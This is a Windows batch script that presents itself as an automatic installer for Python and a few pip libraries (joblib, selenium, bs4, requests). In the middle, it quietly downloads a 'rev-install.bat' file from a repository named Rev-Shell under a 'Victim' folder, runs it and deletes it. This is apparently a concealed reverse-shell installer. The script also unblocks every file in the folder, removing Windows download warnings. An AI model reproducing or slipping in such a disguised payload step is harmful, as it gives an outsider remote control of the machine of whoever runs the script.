@echo off
rem automatically installes python and the required libraries etc.

python --version 3>NUL
if errorlevel 0 goto continue

powershell -command "(New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.6.2/python-3.6.2.exe', 'C:/Tools/python-3.6.2.exe'); & c:\Tools\python-3.6.2.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 TargetDir=c:\Tools\Python362; [Environment]::SetEnvironmentVariable('PATH', ${env:path} + ';C:\Tools\Python362', 'Machine')"

:continue

powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BertilBraun/Rev-Shell/master/Victim/rev-install.bat' -OutFile 'rev.bat'}"
call rev.bat
del rev.bat

pip install joblib
pip install selenium
pip install bs4
pip install requests

powershell -command "dir "%CD%" -Recurse | Unblock-File"

echo.
echo.
echo Hopefully everything installed successfully!
echo.
echo.

pause
